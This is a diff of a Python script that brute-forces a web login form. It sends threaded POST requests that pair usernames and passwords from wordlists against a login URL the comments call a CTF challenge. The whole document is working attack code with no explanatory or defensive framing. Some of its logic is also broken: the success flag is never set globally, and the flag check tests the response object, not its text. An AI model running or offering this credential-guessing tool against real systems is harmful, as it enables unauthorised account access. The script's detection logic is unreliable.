@@ -1,9 +1,10 @@
 import requests
 from concurrent.futures import ThreadPoolExecutor
 import itertools
+from itertools import islice
 # Replace with your actual CTF challenge URL
-url = "http://172.30.0.4/login"
-MAX_THREADS = 15
+url = "http://172.30.0.3/login"
+MAX_THREADS = 5
 username= set()
 password= set()
 success= False
@@ -16,13 +17,14 @@ def read_file(filepath):
         return []
 
 # Standard CTF credential lists (or use custom ones if provided)
-username.update(read_file('wordlist/usernames/admin.txt'))
+username.update(read_file('usernames/admin.txt'))
+
 # username.update(read_file('wordlist/usernames/common.txt'))
 # username.update(read_file('wordlist/usernames.txt'))
-password.update(read_file('wordlist/passwords/common.txt'))
+password.update(read_file('passwords/common.txt'))
 # password.update(read_file('wordlist/passwords/common_small.txt'))
-usernameL= list(username)
-passwordL= list(password)
+usernameL= list(islice(username, 5))
+passwordL= list(islice(password, 5))
 
 print("passwords and usernames are loaded in a list")
 
@@ -37,33 +39,34 @@ def nput(combine):
         "password": pwd
     }
     try:
-        response = requests.post(url, data=payload, allow_redirects=False)
-        if response.status_code in [200, 302] and response.status_code!= 401:
+        response = requests.post(url, data=payload, allow_redirects=False, timeout=5)
+        if response.status_code in [200, 302] and response.status_code!= 401 or "flag" in response:
             success= True
-            print(f"success!! {user}:{pwd}")
+            print(f"----success!! {user}:{pwd}----")
             print(f"status code: {response.status_code}")
             print("response content")
             print(response.text)
-            return True
+            return True, user, pwd
         else:
             print(f"[-] Tried {user}:{pwd} -> Got 401 Unauthorized (History Cleared)", end="\r")
     except requests.exceptions.RequestException:
         # Handle occasional network hiccups gracefully
         pass
-    return False
+    return False, user, pwd
 
 
 print("[*] Starting multi-threaded attack...")
       
-combinations= [(u, p) for u in usernameL for p in passwordL]
+# combinations= [(u, p) for u in usernameL for p in passwordL]
 combinations_generator = itertools.product(usernameL, passwordL)
 
-with ThreadPoolExecutor(MAX_THREADS) as exe:
-    for results in exe.map(nput, combinations):
-        if success:
-            exe.shutdown(wait= False)
-            print("success found!!")
-            break
+with ThreadPoolExecutor(max_workers=None) as exe:
+    print(f"combinations generator are:", combinations_generator)
+    results= exe.map(nput, combinations_generator)
+    print(f"results are:", results)
+    if success:
+        exe.shutdown(wait= False, cancel_futures=True)
+        print("success found!!")
 
 # max_workers=None, thread_name_prefix='', initializer=None, initargs=()
 # for user in usernames:
